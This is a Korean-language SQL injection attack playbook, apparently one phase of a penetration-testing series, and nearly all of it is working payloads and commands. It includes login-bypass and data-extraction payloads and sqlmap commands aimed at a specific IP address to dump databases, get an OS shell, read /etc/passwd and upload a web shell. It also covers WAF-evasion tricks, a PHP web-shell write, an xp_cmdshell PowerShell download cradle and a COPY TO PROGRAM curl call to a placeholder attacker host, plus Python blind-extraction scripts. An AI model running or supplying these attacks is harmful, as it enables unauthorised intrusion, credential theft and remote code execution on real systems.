# Phase 2: SQL Injection 공격

## 개요
SQL Injection은 웹 애플리케이션의 데이터베이스 쿼리에 악의적인 SQL 코드를 삽입하여 인증을 우회하거나 데이터를 탈취하는 공격 기법입니다.

## 필수 도구
- sqlmap
- Burp Suite
- 수동 페이로드
- curl / wget

---

## 1. 수동 SQL Injection 테스트

### 1.1 기본 페이로드
```bash
# 인증 우회 (Authentication Bypass)
' OR '1'='1
' OR 1=1-- -
admin' OR '1'='1
admin' OR 1=1-- -
' OR 'a'='a
admin'-- -
admin' #

# Boolean-based
' AND '1'='1
' AND '1'='2

# Time-based
' AND SLEEP(5)-- -
' OR SLEEP(5)-- -
```

### 1.2 UNION-based SQL Injection
```bash
# 컬럼 수 찾기
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
# 에러가 날 때까지 증가

# UNION SELECT로 데이터 추출
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

# 데이터베이스 정보 추출
' UNION SELECT NULL,version()-- -
' UNION SELECT NULL,database()-- -
' UNION SELECT NULL,user()-- -

# 테이블 목록
' UNION SELECT NULL,table_name FROM information_schema.tables-- -
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()-- -

# 컬럼 목록
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -

# 데이터 추출
' UNION SELECT username,password FROM users-- -
' UNION SELECT NULL,CONCAT(username,':',password) FROM users-- -
```

### 1.3 Error-based SQL Injection
```bash
# MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -

# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)-- -

# MSSQL
' AND 1=CONVERT(int,(SELECT @@version))-- -
```

### 1.4 Blind SQL Injection
```bash
# Boolean-based
' AND (SELECT SUBSTRING(version(),1,1))='5'-- -
' AND LENGTH(database())=4-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100-- -

# Time-based
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(LENGTH(database())=4,SLEEP(5),0)-- -
' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(5),0)-- -
```

---

## 2. sqlmap 자동화 공격

### 2.1 기본 사용법
```bash
# GET 파라미터 테스트
sqlmap -u "http://13.125.80.75/page.php?id=1"

# POST 데이터 테스트
sqlmap -u "http://13.125.80.75/login.php" --data="username=admin&password=admin"

# 폼 자동 탐지
sqlmap -u "http://13.125.80.75/login.php" --forms

# 배치 모드 (모든 질문에 기본값으로 응답)
sqlmap -u "http://13.125.80.75/page.php?id=1" --batch

# 쿠키 사용
sqlmap -u "http://13.125.80.75/page.php?id=1" --cookie="PHPSESSID=abc123"

# HTTP 헤더 추가
sqlmap -u "http://13.125.80.75/page.php?id=1" --header="X-Forwarded-For: 127.0.0.1"
```

### 2.2 데이터베이스 열거
```bash
# 현재 데이터베이스
sqlmap -u "http://13.125.80.75/page.php?id=1" --current-db

# 모든 데이터베이스 목록
sqlmap -u "http://13.125.80.75/page.php?id=1" --dbs

# 특정 DB의 테이블 목록
sqlmap -u "http://13.125.80.75/page.php?id=1" -D database_name --tables

# 특정 테이블의 컬럼 목록
sqlmap -u "http://13.125.80.75/page.php?id=1" -D database_name -T users --columns

# 데이터 덤프
sqlmap -u "http://13.125.80.75/page.php?id=1" -D database_name -T users --dump

# 모든 DB 덤프 (위험!)
sqlmap -u "http://13.125.80.75/page.php?id=1" --dump-all
```

### 2.3 고급 옵션
```bash
# 레벨 및 위험도 설정 (1-5, 높을수록 공격적)
sqlmap -u "http://13.125.80.75/page.php?id=1" --level=5 --risk=3

# 특정 DBMS 지정 (더 빠름)
sqlmap -u "http://13.125.80.75/page.php?id=1" --dbms=mysql

# User-Agent 랜덤화
sqlmap -u "http://13.125.80.75/page.php?id=1" --random-agent

# 프록시 사용 (Burp Suite)
sqlmap -u "http://13.125.80.75/page.php?id=1" --proxy="http://127.0.0.1:8080"

# 결과 저장 디렉토리 지정
sqlmap -u "http://13.125.80.75/page.php?id=1" --output-dir=/tmp/sqlmap_results

# WAF 탐지
sqlmap -u "http://13.125.80.75/page.php?id=1" --identify-waf

# Tamper 스크립트 (WAF 우회)
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=space2comment

# 요청 딜레이 (탐지 회피)
sqlmap -u "http://13.125.80.75/page.php?id=1" --delay=2
```

### 2.4 OS 명령 실행
```bash
# OS 쉘 획득
sqlmap -u "http://13.125.80.75/page.php?id=1" --os-shell

# OS 명령 실행
sqlmap -u "http://13.125.80.75/page.php?id=1" --os-cmd="whoami"

# SQL 쉘
sqlmap -u "http://13.125.80.75/page.php?id=1" --sql-shell

# 파일 읽기
sqlmap -u "http://13.125.80.75/page.php?id=1" --file-read="/etc/passwd"

# 파일 쓰기 (웹셸 업로드)
sqlmap -u "http://13.125.80.75/page.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

---

## 3. WAF 우회 기법

### 3.1 sqlmap Tamper 스크립트
```bash
# 공백 우회
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=space2comment
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=space2plus
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=space2randomblank

# 대소문자 우회
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=randomcase

# 인코딩 우회
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=base64encode
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=charencode

# 여러 tamper 동시 사용
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=space2comment,between,randomcase

# ModSecurity 우회
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=modsecurityversioned

# 주석 삽입
sqlmap -u "http://13.125.80.75/page.php?id=1" --tamper=versionedmorekeywords
```

### 3.2 수동 WAF 우회 페이로드
```bash
# 주석 사용
'/**/OR/**/1=1-- -
'/*!50000OR*/1=1-- -

# 대소문자 혼합
' Or 1=1-- -
' oR 1=1-- -

# URL 인코딩
%27%20OR%201=1--%20-

# Double URL 인코딩
%2527%2520OR%25201=1--%2520-

# 유니코드
%u0027 OR 1=1-- -

# NULL 바이트
' OR 1=1%00-- -

# 공백 대체
'OR(1=1)-- -
'OR/**/1=1-- -
'OR%091=1-- -
'OR%0D1=1-- -
'OR%0A1=1-- -

# 괄호 우회
' OR (SELECT 1)=1-- -
' OR 1=(SELECT 1)-- -
```

---

## 4. 데이터베이스별 SQL Injection

### 4.1 MySQL/MariaDB
```bash
# 버전 확인
' UNION SELECT NULL,version()-- -
' UNION SELECT NULL,@@version-- -

# 현재 DB
' UNION SELECT NULL,database()-- -

# 사용자
' UNION SELECT NULL,user()-- -

# 테이블 목록
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()-- -

# 파일 읽기
' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -

# 파일 쓰기 (웹셸)
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -

# 시간 기반
' AND SLEEP(5)-- -
' AND BENCHMARK(10000000,MD5('A'))-- -
```

### 4.2 PostgreSQL
```bash
# 버전
' UNION SELECT NULL,version()-- -

# 현재 DB
' UNION SELECT NULL,current_database()-- -

# 사용자
' UNION SELECT NULL,current_user-- -

# 테이블 목록
' UNION SELECT NULL,table_name FROM information_schema.tables-- -

# 파일 읽기
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,10000)-- -

# 명령 실행 (pg_execute)
'; COPY (SELECT '') TO PROGRAM 'curl http://YOUR_IP:8080/$(whoami)'-- -
```

### 4.3 MSSQL
```bash
# 버전
' UNION SELECT NULL,@@version-- -

# 현재 DB
' UNION SELECT NULL,DB_NAME()-- -

# 사용자
' UNION SELECT NULL,SYSTEM_USER-- -

# 테이블 목록
' UNION SELECT NULL,name FROM sysobjects WHERE xtype='U'-- -

# 명령 실행 (xp_cmdshell)
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC master..xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://YOUR_IP/shell.ps1'')"'-- -

# 파일 읽기
' UNION SELECT NULL,BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts',SINGLE_CLOB) AS x-- -
```

### 4.4 Oracle
```bash
# 버전
' UNION SELECT NULL,banner FROM v$version-- -

# 현재 사용자
' UNION SELECT NULL,user FROM dual-- -

# 테이블 목록
' UNION SELECT NULL,table_name FROM all_tables-- -

# 시간 기반
' AND DBMS_LOCK.SLEEP(5)-- -
```

---

## 5. Second-Order SQL Injection

### 5.1 개념
사용자 입력이 즉시 쿼리에 사용되지 않고, 나중에 다른 쿼리에서 사용될 때 발생하는 취약점

### 5.2 테스트 방법
```bash
# 1단계: 페이로드 저장 (회원가입 등)
Username: admin'-- -
Email: test@test.com

# 2단계: 저장된 데이터가 사용되는 곳 확인
# (프로필 페이지, 관리자 페이지 등)

# 예시: 프로필 수정 기능
# username이 쿼리에 직접 삽입되면:
# UPDATE users SET email='new@email.com' WHERE username='admin'-- -'
```

---

## 6. Blind SQL Injection 자동화

### 6.1 Python 스크립트 (Boolean-based)
```python
#!/usr/bin/env python3
import requests
import string

url = "http://13.125.80.75/page.php"
charset = string.ascii_lowercase + string.digits + '_'
result = ""

# 데이터베이스 이름 추출
for position in range(1, 20):
    for char in charset:
        payload = f"' AND SUBSTRING(database(),{position},1)='{char}'-- -"
        r = requests.get(url, params={'id': payload})

        if "success" in r.text:  # True 조건 판별
            result += char
            print(f"[+] Found: {result}")
            break

print(f"[+] Database name: {result}")
```

### 6.2 Python 스크립트 (Time-based)
```python
#!/usr/bin/env python3
import requests
import time

url = "http://13.125.80.75/page.php"
result = ""

for position in range(1, 20):
    for ascii_code in range(32, 127):
        payload = f"' AND IF(ASCII(SUBSTRING(database(),{position},1))={ascii_code},SLEEP(3),0)-- -"

        start = time.time()
        r = requests.get(url, params={'id': payload}, timeout=10)
        elapsed = time.time() - start

        if elapsed >= 3:  # SLEEP이 실행됨
            result += chr(ascii_code)
            print(f"[+] Found: {result}")
            break

print(f"[+] Database name: {result}")
```

---

## 7. Burp Suite를 통한 SQL Injection

### 7.1 Burp Suite 설정
```bash
# Burp Suite 실행
burpsuite

# 프록시 설정
# Proxy -> Options -> Proxy Listeners: 127.0.0.1:8080

# 브라우저 프록시 설정
# Firefox: Preferences -> Network Settings -> Manual proxy
# HTTP Proxy: 127.0.0.1, Port: 8080
```

### 7.2 Intruder를 사용한 자동화
```
1. 요청 캡처 (Proxy -> HTTP history)
2. Intruder로 보내기 (우클릭 -> Send to Intruder)
3. Positions 탭:
   - Clear § 클릭
   - 파라미터 값 선택 후 Add § 클릭
4. Payloads 탭:
   - Payload type: Simple list
   - Payload Options: SQL Injection 페이로드 추가
5. Start attack 클릭
6. 결과 분석 (응답 길이, 상태 코드 차이 확인)
```

---

## 8. SQL Injection 방어 우회

### 8.1 Prepared Statement 우회
일부 개발자가 prepared statement를 잘못 사용한 경우:

```php
// 취약한 코드
$stmt = $db->prepare("SELECT * FROM users WHERE username = '$username'");
// $username이 여전히 문자열 연결로 삽입됨
```

### 8.2 필터링 우회
```bash
# 'SELECT' 키워드 필터링
SeLeCt
%53%45%4C%45%43%54
/*!50000SELECT*/

# 공백 필터링
/**/
%09 (Tab)
%0A (Line Feed)
%0D (Carriage Return)

# 'OR' 필터링
||
%6F%72

# 따옴표 필터링
CHAR(97)  # 'a'의 ASCII
0x61      # 'a'의 HEX
```

---

## 9. 실전 시나리오

### 9.1 로그인 우회
```bash
# 기본 우회
Username: admin' OR '1'='1
Password: anything

# 주석 사용
Username: admin'-- -
Password: (empty)

# UNION 사용
Username: ' UNION SELECT 'admin','password'-- -
Password: password
```

### 9.2 데이터 추출 체인
```bash
# 1단계: 취약점 확인
' OR 1=1-- -

# 2단계: 컬럼 수 확인
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -  # 에러 -> 컬럼 2개

# 3단계: UNION으로 DB 정보
' UNION SELECT version(),database()-- -

# 4단계: 테이블 목록
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()-- -

# 5단계: users 테이블 컬럼 확인
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -

# 6단계: 데이터 추출
' UNION SELECT username,password FROM users-- -

# 7단계: 해시 크랙
john --format=raw-md5 hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 핵심 정리

1. **수동 테스트 먼저** - 기본 페이로드로 취약점 존재 여부 확인
2. **sqlmap으로 자동화** - 확인된 취약점을 sqlmap으로 심화 공격
3. **WAF 우회 필수** - Tamper 스크립트와 인코딩 활용
4. **Blind SQLi는 시간 소요** - Boolean/Time-based는 자동화 스크립트 사용
5. **OS 쉘까지 시도** - 가능하면 파일 쓰기로 웹셸 업로드 또는 OS 명령 실행

## 다음 단계
Phase 3: SSRF & AWS IMDS로 진행하여 서버 측 요청 위조 공격
